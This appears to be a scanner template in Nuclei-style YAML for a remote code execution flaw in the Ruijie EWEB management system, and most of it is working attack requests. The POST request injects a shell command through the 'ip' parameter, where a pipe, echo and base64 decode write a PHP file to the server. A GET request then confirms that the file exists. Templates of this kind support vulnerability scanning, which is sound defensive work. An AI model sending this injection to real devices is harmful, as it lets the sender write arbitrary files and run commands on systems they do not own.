id: ruijie-EWEB-rce
info:
  author: str1am
  name: "\u9510\u6377VPN\u8D8A\u6743\u7ED1\u5B9A&\u4FE1\u606F\u6CC4\u9732"
  reference:
  - https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/%E9%94%90%E6%8D%B7-EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9FRCE.md
  severity: high
  tags: ruijie,rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - 1a2b3c4d
  matchers-condition: and
  raw:
  - 'POST /guest_auth/guestIsUp.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101
    Firefox/92.0


    ip=127.0.0.1|echo "MWEyYjNjNGQ="|base64 -d > test_Ruijie.php&mac=00-00

    '
  - 'GET /test_Ruijie.php HTTP/1.1

    Host: {{Hostname}}

    '
